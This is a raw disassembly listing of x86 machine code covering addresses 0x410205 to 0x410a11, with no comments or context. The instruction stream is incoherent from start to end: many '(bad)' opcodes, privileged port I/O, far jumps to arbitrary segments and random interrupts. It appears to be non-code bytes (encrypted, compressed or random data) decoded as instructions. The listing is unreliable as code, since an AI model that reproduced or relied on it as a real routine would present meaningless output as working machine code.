  410205:	test   eax,0x3f29d764
  41020a:	aad    0xec
  41020c:	sbb    dl,BYTE PTR [edx-0x56627ab0]
  410212:	jnp    0x410219
  410214:	aas    
  410215:	fwait
  410216:	js     0x41022e
  410218:	iret   
  410219:	mov    dl,0x7d
  41021b:	add    DWORD PTR [ebp+0x5fbd66e6],ebx
  410221:	mov    dh,0x70
  410223:	push   0x6a
  410225:	sbb    eax,0xb47173db
  41022a:	fs push cs
  41022c:	jmp    0x5fb45ace
  410231:	test   DWORD PTR [ebx-0x4a],edi
  410234:	push   0x182af3b
  410239:	jg     0x41026f
  41023b:	lahf   
  41023c:	in     al,0x4f
  41023e:	jmp    0x3eec:0x490ca3ef
  410245:	xchg   esp,eax
  410246:	stos   BYTE PTR es:[edi],al
  410247:	cs push ss
  410249:	lahf   
  41024a:	cmp    DWORD PTR [edi+0x6d],edx
  41024d:	add    DWORD PTR [esi+0xc],esp
  410250:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410251:	sbb    dl,bl
  410253:	jmp    0x41a:0xffce16eb
  41025a:	cmc    
  41025b:	test   DWORD PTR [edx+0x39ba0b8f],edx
  410261:	in     eax,0x35
  410263:	shr    BYTE PTR [ebx-0x66],0xcd
  410267:	mov    esi,0x188c96c3
  41026c:	aas    
  41026d:	call   ebp
  41026f:	adc    esi,esi
  410271:	xchg   ebx,eax
  410272:	xchg   esp,eax
  410273:	jne    0x4102ad
  410275:	xchg   ecx,eax
  410276:	sub    BYTE PTR [edx],cl
  410278:	xlat   BYTE PTR ds:[ebx]
  410279:	push   ebp
  41027a:	inc    ebp
  41027b:	sub    eax,0xa6a6debf
  410280:	(bad)  
  410282:	mov    edx,0x5c64adf2
  410287:	cld    
  410288:	mov    ebx,DWORD PTR [eax-0x41f99ee5]
  41028e:	push   esi
  41028f:	inc    ebp
  410290:	int3   
  410291:	out    0x29,al
  410293:	jo     0x41030f
  410295:	rcr    BYTE PTR [eax+0x769dd8a6],1
  41029b:	out    0x3a,eax
  41029d:	push   0xffffff93
  41029f:	es cmp dh,bh
  4102a2:	pop    ss
  4102a3:	or     DWORD PTR [edi],edi
  4102a5:	sbb    bl,BYTE PTR [edx+0x4f]
  4102a8:	and    DWORD PTR [ecx-0x1b],esp
  4102ab:	push   es
  4102ac:	cmp    ah,BYTE PTR [esi+0x19]
  4102af:	push   0x5a
  4102b1:	das    
  4102b2:	out    dx,eax
  4102b3:	pushf  
  4102b4:	dec    esi
  4102b5:	mov    ah,0x4f
  4102b7:	test   DWORD PTR [ebp+0x3f5a0e17],esi
  4102bd:	mov    ebx,DWORD PTR [ebx+eiz*8+0x73]
  4102c1:	add    dh,BYTE PTR [esi-0x4b]
  4102c4:	dec    ecx
  4102c5:	in     eax,0x62
  4102c7:	(bad)  
  4102c8:	push   edi
  4102c9:	test   ebp,edi
  4102cb:	xor    dl,ah
  4102cd:	data16 mov dh,0x92
  4102d0:	hlt    
  4102d1:	sbb    bh,ah
  4102d3:	cmp    eax,0x1a2df806
  4102d8:	xchg   DWORD PTR [esi-0x1c4b9c58],esp
  4102de:	sub    DWORD PTR [ebx],0x8508b722
  4102e4:	jle    0x410305
  4102e6:	mov    dh,0x6
  4102e8:	ds stos DWORD PTR es:[edi],eax
  4102ea:	pop    es
  4102eb:	xchg   edi,eax
  4102ec:	ror    DWORD PTR [ecx-0x69430e25],1
  4102f2:	jle    0x410277
  4102f4:	inc    eax
  4102f5:	cmp    ebx,DWORD PTR [edx]
  4102f7:	mov    ebp,0x35a9b75
  4102fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102fd:	js     0x410320
  4102ff:	lods   al,BYTE PTR ds:[esi]
  410300:	add    al,0x91
  410302:	jmp    0xfa85:0x79b5d676
  410309:	mov    esp,ss
  41030b:	scas   eax,DWORD PTR es:[edi]
  41030c:	les    edi,FWORD PTR [edx+0x3a]
  41030f:	fwait
  410310:	(bad)  
  410311:	push   eax
  410312:	fwait
  410313:	shl    ebp,cl
  410315:	aaa    
  410316:	inc    edx
  410317:	sub    al,0x5a
  410319:	inc    ecx
  41031a:	pop    edx
  41031b:	clc    
  41031c:	mov    eax,0x168a794c
  410321:	add    al,0x4f
  410323:	test   DWORD PTR [edx+0x65],edx
  410326:	ins    DWORD PTR es:[edi],dx
  410327:	pop    ss
  410328:	aas    
  410329:	sbb    esp,DWORD PTR [eax]
  41032b:	xchg   ebx,eax
  41032c:	ficomp DWORD PTR [edi+0x1b]
  41032f:	loopne 0x41039e
  410331:	out    0x8,al
  410333:	dec    edx
  410334:	mov    cl,BYTE PTR [ebp-0x7d]
  410337:	cmp    ah,al
  410339:	or     al,0xb4
  41033b:	hlt    
  41033c:	push   esi
  41033d:	ja     0x4103a1
  41033f:	shr    BYTE PTR [ecx-0x1a],0xf6
  410343:	mov    cl,BYTE PTR [ebx+0x3fc03130]
  410349:	push   ebp
  41034a:	arpl   si,bx
  41034c:	iret   
  41034d:	push   0xe1f06a90
  410352:	ret    0xfcd7
  410355:	mov    DWORD PTR [eax],ebx
  410357:	push   ecx
  410358:	iret   
  410359:	cmp    al,0xf8
  41035b:	push   0x3e15313e
  410360:	xchg   BYTE PTR [eax],dl
  410362:	js     0x410320
  410364:	rcr    DWORD PTR [edi+0x2b3ed5bc],1
  41036a:	sub    DWORD PTR [eax+0x38],edi
  41036d:	cmp    ebp,edi
  41036f:	sub    al,0x3d
  410371:	pop    ss
  410372:	jae    0x4103d3
  410374:	cs push ds
  410376:	shr    ebp,0xb6
  410379:	jp     0x41038c
  41037b:	sbb    eax,0x847896aa
  410380:	add    dl,BYTE PTR [eax+0x42]
  410383:	fidivr WORD PTR [esi]
  410385:	add    ebx,DWORD PTR [ecx+0x77]
  410388:	sub    BYTE PTR [edx-0x6860deb6],cl
  41038e:	push   0x6fd73dbc
  410393:	add    eax,0x8f0ce499
  410398:	arpl   dx,ax
  41039a:	jb     0x4103c1
  41039c:	mov    ebp,0x2bc0ea03
  4103a1:	inc    ebp
  4103a2:	pop    ss
  4103a3:	loopne 0x410419
  4103a5:	adc    ebx,DWORD PTR [edx+0x60]
  4103a8:	xchg   bh,ah
  4103aa:	cmovno di,WORD PTR cs:[edx+esi*1]
  4103b0:	bound  eax,QWORD PTR [edi+0x69]
  4103b3:	ds leave 
  4103b5:	in     al,0xcd
  4103b7:	test   DWORD PTR [esi-0x439b6eac],eax
  4103bd:	fptan  
  4103bf:	cmp    esp,DWORD PTR [esi-0x4cc9ce1a]
  4103c5:	jae    0x410417
  4103c7:	mov    ebx,0x417fb73e
  4103cc:	(bad)  
  4103cd:	adc    BYTE PTR [ebp+0x7f],bl
  4103d0:	out    0x1d,eax
  4103d2:	(bad)  
  4103d3:	in     al,dx
  4103d4:	xchg   edx,eax
  4103d5:	call   0x35e88965
  4103da:	pusha  
  4103db:	js     0x4103dd
  4103dd:	arpl   WORD PTR [eax-0x7b2541b3],di
  4103e3:	(bad)  
  4103e5:	int    0xdc
  4103e7:	pushf  
  4103e8:	and    BYTE PTR ds:0x974985e8,0x6a
  4103ef:	mov    dh,0xfb
  4103f1:	clc    
  4103f2:	or     al,0xd0
  4103f4:	cmp    DWORD PTR [edi+0x3a],edx
  4103f7:	test   eax,0x190a6a63
  4103fc:	lods   eax,DWORD PTR ds:[esi]
  4103fd:	scas   al,BYTE PTR es:[edi]
  4103fe:	das    
  4103ff:	in     al,0x68
  410401:	int    0x14
  410403:	test   DWORD PTR [ebp+0x19],esp
  410406:	(bad)  
  410408:	aas    
  410409:	adc    eax,0xcfe70fae
  41040e:	push   ebp
  41040f:	ret    0x32d
  410412:	jnp    0x41046d
  410414:	jmp    0x5b56:0x44852726
  41041b:	mov    DWORD PTR [edi],edi
  41041d:	test   DWORD PTR [ecx-0x79],0xd0ea69ad
  410424:	icebp  
  410425:	add    BYTE PTR [esi+0x281b21c],cl
  41042b:	mov    al,ds:0x8a79cec4
  410430:	out    0xfa,al
  410432:	or     esp,DWORD PTR ds:0x9409bf31
  410438:	push   esp
  410439:	(bad)  
  41043a:	sti    
  41043b:	pop    edi
  41043c:	add    dh,BYTE PTR [ebx-0x7f5711a6]
  410442:	cmp    al,BYTE PTR [ebp+0x5ce52614]
  410448:	and    BYTE PTR [edi-0x19c30cdd],dh
  41044e:	popf   
  41044f:	lock shr BYTE PTR [ebx],cl
  410452:	in     al,dx
  410453:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410454:	in     al,0xbb
  410456:	sbb    al,BYTE PTR [esp+ebp*2-0xd11bb1b]
  41045d:	cmp    BYTE PTR [esi+0x5a5c58c9],dl
  410463:	dec    esi
  410464:	clflush BYTE PTR [eax+0x646080a7]
  41046b:	xchg   DWORD PTR [ecx],eax
  41046d:	(bad)  
  41046e:	jns    0x410472
  410470:	lock loop 0x41045e
  410473:	in     eax,0x3c
  410475:	add    al,BYTE PTR [edi]
  410477:	cwde   
  410478:	cmp    eax,0x7882200b
  41047d:	test   al,0x3b
  41047f:	in     eax,dx
  410480:	mov    esp,0x12d29b30
  410485:	outs   dx,DWORD PTR ds:[esi]
  410486:	(bad)  
  410487:	(bad)  
  410488:	xor    eax,0xd43df9e6
  41048d:	add    eax,0xeb813958
  410492:	pop    edx
  410493:	push   ss
  410494:	out    0x64,eax
  410496:	pop    esp
  410497:	and    BYTE PTR [edi+ebx*2-0x2bb017a],bl
  41049e:	mov    edi,0xd287f584
  4104a3:	jmp    0x385bede7
  4104a8:	aad    0x4a
  4104aa:	pop    es
  4104ab:	and    eax,0x971215ef
  4104b0:	js     0x41044f
  4104b2:	dec    ebp
  4104b3:	test   DWORD PTR [eax+0x3e88e779],esp
  4104b9:	push   edi
  4104ba:	popf   
  4104bb:	fwait
  4104bc:	outs   dx,DWORD PTR ds:[esi]
  4104bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104be:	test   al,0xef
  4104c0:	cld    
  4104c1:	out    0x36,eax
  4104c3:	inc    esp
  4104c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104c5:	inc    ebx
  4104c6:	out    dx,al
  4104c7:	push   ebp
  4104c8:	call   0x686799ff
  4104cd:	xchg   edx,eax
  4104ce:	push   ebx
  4104cf:	add    BYTE PTR [esi+0x1e121176],bh
  4104d5:	out    0x5a,eax
  4104d7:	aaa    
  4104d8:	mov    al,ds:0xd9776660
  4104dd:	push   edx
  4104de:	cmp    al,0xfe
  4104e0:	or     eax,0xb2605ba2
  4104e5:	xor    bh,BYTE PTR [ebx+0x42e63656]
  4104eb:	jae    0x410549
  4104ed:	push   esp
  4104ee:	add    ah,bh
  4104f0:	std    
  4104f1:	int    0x94
  4104f3:	aad    0x2d
  4104f5:	stc    
  4104f6:	push   ebp
  4104f7:	cmp    BYTE PTR [edi-0x6f0256d4],0xe6
  4104fe:	xor    al,0xfb
  410500:	mov    ebx,0xa6cf1a22
  410505:	mov    esi,DWORD PTR [ebx+0x2be76c3a]
  41050b:	cwde   
  41050c:	fisub  DWORD PTR [esi+0xe49b798]
  410512:	mov    ebx,0xd970aa0a
  410517:	add    DWORD PTR [ebx-0x60],0x314b1f55
  41051e:	call   0x15b8:0x5affe6b2
  410525:	mov    ebx,0x65daad0f
  41052a:	sbb    al,BYTE PTR [ebp-0x79666e64]
  410530:	add    ebx,DWORD PTR ds:0x5ebe781c
  410536:	push   edx
  410537:	ins    DWORD PTR es:[edi],dx
  410538:	mov    edx,0x4a3e563
  41053d:	pop    ds
  41053e:	(bad)  
  410540:	cmp    eax,0x837b21d2
  410545:	and    ecx,DWORD PTR [esi-0x6c]
  410548:	ror    ebp,0xd8
  41054b:	je     0x41050c
  41054d:	popa   
  41054e:	pop    ebx
  41054f:	call   0x6ad3fcbd
  410554:	(bad)  
  410555:	pop    ecx
  410556:	push   edx
  410557:	mov    ds:0x852d0640,al
  41055c:	int    0xae
  41055e:	pop    esi
  41055f:	stc    
  410560:	outs   dx,DWORD PTR ds:[esi]
  410561:	sbb    BYTE PTR [edx-0x24],0x15
  410565:	cmp    eax,esp
  410567:	pop    ss
  410568:	jp     0x41054e
  41056a:	call   0x5134:0x1b13167b
  410571:	pop    esi
  410572:	mov    cl,0x22
  410574:	rol    esi,cl
  410576:	xor    DWORD PTR [edx+0x2e5bd611],ecx
  41057c:	and    BYTE PTR [ebp-0x6f],al
  41057f:	mov    WORD PTR [esi-0x76],es
  410582:	test   DWORD PTR [edx-0x5f9b26c1],edx
  410588:	gs or  eax,0x7cb95014
  41058e:	push   ss
  41058f:	push   edx
  410590:	popa   
  410591:	push   edx
  410592:	pop    ebp
  410593:	je     0x4105c6
  410595:	jne    0x4105ea
  410597:	add    eax,0x84f5d160
  41059c:	in     al,0x33
  41059e:	sar    BYTE PTR [edi+0x14e12ef],cl
  4105a4:	cmp    bl,cl
  4105a6:	fs inc esi
  4105a8:	fcomip st,st(1)
  4105aa:	fisub  DWORD PTR [edi+0x5820ca4c]
  4105b0:	mov    ah,dh
  4105b2:	sbb    al,0x4
  4105b4:	and    al,0x13
  4105b6:	hlt    
  4105b7:	mov    BYTE PTR [esi],bh
  4105b9:	and    eax,0xf3cec118
  4105be:	aad    0xcd
  4105c0:	mov    dl,BYTE PTR [ecx]
  4105c2:	loopne 0x410553
  4105c4:	(bad)  
  4105c5:	and    eax,0xaa778683
  4105ca:	jg     0x4105f6
  4105cc:	in     eax,0x77
  4105ce:	adc    al,0x54
  4105d0:	pushf  
  4105d1:	fistp  DWORD PTR [ebx-0x1a]
  4105d4:	xchg   edx,eax
  4105d5:	mov    ebp,DWORD PTR ds:0x7b4dfe5d
  4105db:	test   BYTE PTR [edi-0xd],dh
  4105de:	jns    0x410635
  4105e0:	ds (bad) 
  4105e2:	into   
  4105e3:	leave  
  4105e4:	test   eax,0x6de38cad
  4105e9:	out    0xec,eax
  4105eb:	inc    esi
  4105ec:	jge    0x410590
  4105ee:	xchg   DWORD PTR [ebx],esi
  4105f0:	dec    edx
  4105f1:	mov    al,ds:0x2b1192e3
  4105f6:	pop    edx
  4105f7:	push   esi
  4105f8:	push   edi
  4105f9:	nop
  4105fa:	mov    al,BYTE PTR [ecx-0x30]
  4105fd:	sub    DWORD PTR [ecx-0x7c],0x19d9fb74
  410604:	aas    
  410605:	inc    ecx
  410606:	add    edi,ecx
  410608:	fadd   QWORD PTR [ecx-0x23a93720]
  41060e:	sbb    al,BYTE PTR [edx-0x2]
  410611:	addr16 pop edx
  410613:	lahf   
  410614:	outs   dx,DWORD PTR ds:[esi]
  410615:	pop    ecx
  410616:	and    bl,BYTE PTR [eax-0x25]
  410619:	cmp    al,0xba
  41061b:	retf   
  41061c:	or     al,0xf8
  41061e:	pop    ecx
  41061f:	push   ss
  410620:	(bad)  
  410621:	(bad)  
  410622:	aaa    
  410623:	stc    
  410624:	ja     0x41061e
  410626:	repnz imul ebx,edx,0xbc1d8565
  41062d:	ds test DWORD PTR ss:[eax+0x676a6a32],ebp
  410635:	pop    ss
  410636:	pop    edx
  410637:	xchg   esp,eax
  410638:	cli    
  410639:	pusha  
  41063a:	cmp    al,0x72
  41063c:	cmp    al,0x41
  41063e:	aam    0x84
  410640:	fistp  QWORD PTR [edx-0x1a]
  410643:	fwait
  410644:	scas   al,BYTE PTR es:[edi]
  410645:	out    dx,eax
  410646:	mov    esi,0xefb27cd3
  41064b:	test   BYTE PTR [edx+ebp*8],bh
  41064e:	sub    esp,DWORD PTR [eax+0x16]
  410651:	shl    bl,cl
  410653:	test   DWORD PTR ds:0x3eba21c8,esi
  410659:	in     eax,dx
  41065a:	fadd   QWORD PTR [esi+0x19aa6d2e]
  410660:	mov    bl,0xe6
  410662:	xchg   esi,eax
  410663:	pop    ecx
  410664:	xchg   ecx,eax
  410665:	sbb    DWORD PTR [esi],edx
  410667:	mov    dh,0x4a
  410669:	lods   eax,DWORD PTR ds:[esi]
  41066a:	and    eax,0x5b79e8bd
  41066f:	in     al,dx
  410670:	shl    ebp,cl
  410672:	xor    ecx,ecx
  410674:	sbb    BYTE PTR [esi],dl
  410676:	ins    BYTE PTR es:[edi],dx
  410677:	test   DWORD PTR [edi+0x67],esp
  41067a:	or     ebx,DWORD PTR [ebp+0x3f]
  41067d:	sti    
  41067e:	loope  0x4106a3
  410680:	ins    BYTE PTR es:[edi],dx
  410681:	xchg   edi,eax
  410682:	adc    BYTE PTR ds:0x698ed936,al
  410688:	iret   
  410689:	out    0xa7,al
  41068b:	rcr    BYTE PTR [esp+esi*2-0x71],cl
  41068f:	jp     0x4106cf
  410691:	imul   edx,ecx,0xffffffa6
  410694:	dec    eax
  410695:	add    al,0x96
  410697:	push   edi
  410698:	push   ebx
  410699:	fisubr WORD PTR [eax+0x7c6664d1]
  41069f:	cmp    cl,cl
  4106a1:	mov    esi,0x2d3e349c
  4106a6:	(bad)  
  4106a7:	or     ch,BYTE PTR [eax-0x1376e0a0]
  4106ad:	out    0x42,eax
  4106af:	cmp    BYTE PTR [ebp+0x43eed999],cl
  4106b5:	or     esi,DWORD PTR [edi]
  4106b7:	cmp    al,0xbf
  4106b9:	ficomp DWORD PTR [ebx+0x72]
  4106bc:	adc    BYTE PTR ds:0x6060e611,dh
  4106c2:	pusha  
  4106c3:	test   DWORD PTR [ebx],edx
  4106c5:	or     BYTE PTR [eax+0x66],ch
  4106c8:	aas    
  4106c9:	rcr    DWORD PTR ds:0x9185196d,0x1a
  4106d0:	or     al,0xe6
  4106d2:	xchg   esp,eax
  4106d3:	and    DWORD PTR [esi+0x14dfd130],eax
  4106d9:	fidiv  WORD PTR [edi]
  4106db:	addr16 push 0x6
  4106de:	pop    ebx
  4106df:	(bad)  
  4106e0:	mov    ds:0x97f33020,ax
  4106e6:	loopne 0x410731
  4106e8:	aas    
  4106e9:	(bad)  
  4106ea:	pop    ecx
  4106eb:	outs   dx,DWORD PTR ds:[esi]
  4106ec:	lahf   
  4106ed:	and    DWORD PTR [ebp-0x4a],edx
  4106f0:	ds jae 0x41072c
  4106f3:	push   edx
  4106f4:	jge    0x4106b6
  4106f6:	sti    
  4106f7:	out    0x8,eax
  4106f9:	push   ds
  4106fa:	aaa    
  4106fb:	gs lock xor al,0x1a
  4106ff:	test   DWORD PTR [esi+0x3ee1e70e],eax
  410705:	retf   
  410706:	cvtpi2ps xmm1,QWORD PTR [ebx-0x37ab714]
  41070d:	stc    
  41070e:	cmp    al,0x99
  410710:	sub    eax,DWORD PTR [eax-0x3d]
  410713:	imul   edi,DWORD PTR [edx+0xf],0x5a
  410717:	iret   
  410718:	ds pop edi
  41071a:	inc    ecx
  41071b:	push   ds
  41071c:	jo     0x41078e
  41071e:	stc    
  41071f:	mov    esp,0x5b82e60a
  410724:	sbb    ebx,DWORD PTR [edi+edx*2]
  410727:	pop    ebx
  410728:	shr    BYTE PTR [edi],1
  41072a:	pop    ecx
  41072b:	jnp    0x41077a
  41072d:	dec    edi
  41072e:	mov    ebx,0x3fd87f55
  410733:	xchg   edx,eax
  410734:	sub    DWORD PTR [edi-0x18787b18],0xb3644de
  41073e:	aad    0x20
  410740:	fsub   st,st(1)
  410742:	(bad)  
  410743:	mov    esi,0xfe5bb471
  410748:	sub    DWORD PTR [edi],ebp
  41074a:	sbb    dl,ah
  41074c:	sub    al,0x4c
  41074e:	mov    al,0x82
  410750:	dec    eax
  410751:	jnp    0x410775
  410753:	fdiv   DWORD PTR [esi+0x71]
  410756:	sbb    dl,BYTE PTR [ecx+0x385a1713]
  41075c:	cmc    
  41075d:	xchg   DWORD PTR [ecx],eax
  41075f:	mov    ebx,0x8511785a
  410764:	pop    eax
  410765:	(bad)  
  410767:	mov    ch,0x38
  410769:	psubq  mm1,QWORD PTR [ecx+0x646ffae0]
  410770:	aas    
  410771:	mov    ebp,0xe7a96b5d
  410776:	fs sbb al,0xe2
  410779:	adc    bl,BYTE PTR [eax]
  41077b:	sbb    eax,DWORD PTR [ebp-0x63]
  41077e:	std    
  41077f:	and    edx,eax
  410781:	push   ds
  410782:	pop    ebx
  410783:	in     al,dx
  410784:	scas   eax,DWORD PTR es:[edi]
  410785:	iret   
  410786:	push   edi
  410787:	ja     0x41074d
  410789:	loopne 0x4107b9
  41078b:	arpl   sp,sp
  41078d:	jmp    0x83ff:0xcaf3308
  410794:	aas    
  410795:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410796:	into   
  410797:	sbb    al,0x96
  410799:	dec    ebx
  41079a:	test   edx,ebp
  41079c:	adc    ah,bh
  41079e:	push   0x35
  4107a0:	pop    es
  4107a1:	inc    ecx
  4107a2:	pusha  
  4107a3:	push   esp
  4107a4:	sti    
  4107a5:	stos   DWORD PTR es:[edi],eax
  4107a6:	jmp    0x410775
  4107a8:	je     0x410820
  4107aa:	pop    edx
  4107ab:	scas   al,BYTE PTR es:[edi]
  4107ac:	mov    ebx,0xb4e51ab9
  4107b1:	rol    BYTE PTR [esi-0x7b],1
  4107b4:	mov    esp,0x3fe98c75
  4107b9:	xadd   BYTE PTR [ebp-0x23a81d1b],al
  4107c0:	out    0xfa,al
  4107c2:	sbb    BYTE PTR [edx],cl
  4107c4:	inc    edi
  4107c5:	pop    esp
  4107c6:	lock in eax,0xff
  4107c9:	out    dx,eax
  4107ca:	fiadd  DWORD PTR [edi+0x3e]
  4107cd:	sub    ecx,DWORD PTR [eax+edx*4+0x7ba29c7e]
  4107d4:	mov    edi,ds
  4107d6:	inc    esi
  4107d7:	cmp    eax,0x80dee70b
  4107dc:	jp     0x4107f5
  4107de:	jl     0x4107cc
  4107e0:	cmp    eax,0xd20bb92f
  4107e5:	jo     0x4107b4
  4107e7:	push   cs
  4107e8:	pop    esi
  4107e9:	dec    ebx
  4107ea:	shl    DWORD PTR [ebx+0x3a],cl
  4107ed:	xchg   ecx,eax
  4107ee:	sub    BYTE PTR [ebp+0x76392555],al
  4107f4:	ds xor eax,0x76ebbd4e
  4107fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107fb:	test   al,0xb8
  4107fd:	out    0xe4,eax
  4107ff:	mov    cl,0x58
  410801:	mov    edi,0x3b1988f5
  410806:	cmp    dh,BYTE PTR [esi]
  410808:	inc    ecx
  410809:	stos   BYTE PTR es:[edi],al
  41080a:	fs sbb al,0x54
  41080d:	pop    esp
  41080e:	fadd   DWORD PTR [eax+0x7f]
  410811:	cdq    
  410812:	hlt    
  410813:	cmp    ecx,DWORD PTR [edi+edx*1-0x3f]
  410817:	test   DWORD PTR [edi+0x3f04829f],edi
  41081d:	in     eax,dx
  41081e:	repz push ebx
  410820:	push   edx
  410821:	sbb    DWORD PTR [edi-0x6c],edx
  410824:	popa   
  410825:	out    0xf8,al
  410827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410828:	in     al,0x68
  41082a:	sub    BYTE PTR [eax+0x7b],dh
  41082d:	mov    edx,0x81c8e413
  410832:	push   ecx
  410833:	push   eax
  410834:	ds cmp al,0xdb
  410837:	mov    eax,edi
  410839:	out    0xd2,eax
  41083b:	xchg   esi,eax
  41083c:	out    0x85,eax
  41083e:	cld    
  41083f:	mov    edx,0x9c4ad6db
  410844:	sub    eax,0xd52e5b6a
  410849:	jge    0x4108c0
  41084b:	inc    BYTE PTR [esi+0x648a03a1]
  410851:	xchg   DWORD PTR [ecx],edi
  410853:	repz fs into 
  410856:	jge    0x4108a1
  410858:	pop    eax
  410859:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41085a:	pop    edx
  41085b:	int3   
  41085c:	or     DWORD PTR [edx+0x7f44a405],edx
  410862:	sbb    ecx,DWORD PTR [ebx+ebx*2+0x547e25e6]
  410869:	mov    esp,esi
  41086b:	ss mov dh,0xae
  41086e:	pop    ebx
  41086f:	nop
  410870:	test   eax,0xba468067
  410875:	jp     0x410808
  410877:	and    al,0xbc
  41087a:	div    eax
  41087c:	jge    0x41087b
  41087e:	cli    
  41087f:	xor    esi,edx
  410881:	mov    ecx,0xe23f1a47
  410886:	(bad)  
  410887:	cli    
  410888:	jns    0x4108aa
  41088a:	adc    DWORD PTR [ebp-0x73],esp
  41088d:	out    0x50,eax
  41088f:	push   0xeb01d178
  410894:	in     eax,0x1d
  410896:	inc    ecx
  410897:	aad    0xda
  410899:	(bad)  
  41089a:	pop    ebp
  41089b:	sar    BYTE PTR [ebp-0x2f59865a],cl
  4108a1:	adc    edi,DWORD PTR [eax+ecx*8-0x7603484]
  4108a8:	in     eax,0x56
  4108aa:	pop    ebx
  4108ab:	jo     0x4108fb
  4108ad:	(bad)  
  4108ae:	xchg   edi,eax
  4108af:	jmp    0x410903
  4108b1:	add    al,0x5d
  4108b3:	(bad)  
  4108b4:	dec    ebp
  4108b5:	(bad)  
  4108b6:	adc    eax,0xb2e74529
  4108bb:	sbb    al,0x8a
  4108bd:	mov    ebp,0xba3677bb
  4108c2:	sti    
  4108c3:	fimul  DWORD PTR [ebx-0x7d]
  4108c6:	inc    si
  4108c8:	mov    ds:0xda335b21,al
  4108cd:	test   BYTE PTR [esi-0x2],cl
  4108d0:	pop    ds
  4108d1:	dec    esp
  4108d2:	dec    esp
  4108d3:	in     eax,0x2a
  4108d5:	cli    
  4108d6:	adc    eax,0x592f41e5
  4108db:	or     al,bl
  4108dd:	and    al,ah
  4108df:	div    DWORD PTR [edx-0x19]
  4108e2:	call   0x8d49:0x138eef67
  4108e9:	outs   dx,BYTE PTR ds:[esi]
  4108ea:	stc    
  4108eb:	popa   
  4108ec:	lock mov dl,0x5d
  4108ef:	mov    dl,BYTE PTR [edx-0x6a]
  4108f2:	jmp    0x41090d
  4108f4:	sub    al,0xfb
  4108f6:	jle    0x41093e
  4108f8:	adc    DWORD PTR [edi],edx
  4108fa:	(bad)  
  4108fb:	lock adc al,BYTE PTR [edx-0x65]
  4108ff:	ins    DWORD PTR es:[edi],dx
  410900:	sbb    BYTE PTR ds:0x93ea4ce,ch
  410906:	xor    bl,dh
  410908:	and    eax,0x6e595805
  41090d:	mov    eax,0x6f9385b8
  410912:	sbb    dh,BYTE PTR [eax-0x374fd4c1]
  410918:	pop    ecx
  410919:	dec    esp
  41091a:	jg     0x4108ac
  41091c:	and    al,0xe6
  41091e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41091f:	sbb    DWORD PTR [ebp-0x35b02ebb],ecx
  410925:	into   
  410926:	dec    esp
  410927:	repnz dec edi
  410929:	lods   al,BYTE PTR ds:[esi]
  41092a:	pop    edx
  41092b:	in     al,dx
  41092c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41092d:	jmp    0xfcdf155a
  410932:	mov    es,WORD PTR [ecx+edi*8+0x3e8d604c]
  410939:	jne    0x4108c7
  41093b:	retf   0xd489
  41093e:	ret    
  41093f:	jmp    0xf63187df
  410944:	aas    
  410945:	mov    ch,0x55
  410947:	in     al,0x73
  410949:	dec    edx
  41094a:	popf   
  41094b:	fwait
  41094c:	and    esp,DWORD PTR [edi+0x2628446b]
  410952:	aad    0x57
  410954:	add    cl,dl
  410956:	das    
  410957:	popf   
  410958:	call   0xc479:0x8c84c67d
  41095f:	pop    ecx
  410960:	cmp    BYTE PTR [edi-0x5c96b47c],dh
  410966:	std    
  410967:	sahf   
  410968:	pop    DWORD PTR [edx]
  41096a:	popf   
  41096b:	inc    esp
  41096c:	aam    0xe7
  41096e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41096f:	call   0x33b8:0xfbf4e43f
  410976:	call   0xa3bc:0x5aef2db9
  41097d:	(bad)  
  41097e:	ror    BYTE PTR [ecx-0x1a],cl
  410981:	sbb    ah,BYTE PTR ds:0x63847b84
  410987:	push   cs
  410988:	ja     0x4109d3
  41098a:	mov    edi,0xc0933e0a
  41098f:	cwde   
  410990:	pop    eax
  410991:	xchg   edi,eax
  410992:	in     al,0x22
  410994:	bound  edi,QWORD PTR [ecx+0x4f]
  410997:	adc    edi,0xfffffff9
  41099a:	out    dx,al
  41099b:	mov    edi,0x193a4b7f
  4109a0:	test   BYTE PTR [eax],al
  4109a2:	pop    eax
  4109a3:	dec    edx
  4109a4:	dec    ebp
  4109a5:	test   BYTE PTR [ebp+edi*1+0x31eade68],0x8d
  4109ad:	in     al,0x18
  4109af:	ror    BYTE PTR [edi+0x39a00332],0x8
  4109b6:	pop    edi
  4109b7:	es fs xor al,0x5a
  4109bb:	adc    edx,DWORD PTR ds:0xc76c5aad
  4109c1:	test   al,0x10
  4109c3:	lods   eax,DWORD PTR ds:[esi]
  4109c4:	ds xchg esp,eax
  4109c6:	jecxz  0x41094c
  4109c8:	jecxz  0x4109d5
  4109ca:	add    bh,BYTE PTR [edi+eax*1+0x3efcaa67]
  4109d1:	in     al,0xbb
  4109d3:	out    0xf7,eax
  4109d5:	imul   DWORD PTR [ebp-0x7d]
  4109d8:	daa    
  4109d9:	out    0xc8,al
  4109db:	pop    ebp
  4109dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109dd:	xor    eax,0xbe4f5a8f
  4109e2:	jg     0x4109eb
  4109e4:	add    esi,DWORD PTR [esi]
  4109e6:	push   ss
  4109e7:	sar    BYTE PTR [ecx+esi*1],cl
  4109ea:	pop    esp
  4109eb:	inc    eax
  4109ec:	lds    ecx,FWORD PTR [ebx+0x5f]
  4109ef:	in     eax,0x28
  4109f1:	cld    
  4109f2:	jb     0x410979
  4109f4:	shl    BYTE PTR ds:[ebx-0x49d0dd1f],1
  4109fb:	lods   al,BYTE PTR ds:[esi]
  4109fc:	pop    es
  4109fd:	ins    DWORD PTR es:[edi],dx
  4109fe:	cmp    al,0x95
  410a00:	mov    esi,0xc36d693c
  410a05:	out    0xdc,eax
  410a07:	mov    ebp,0xb11f49a0
  410a0c:	mov    ebp,0x3e29abd0
  410a11:	mov    cl,0x6b
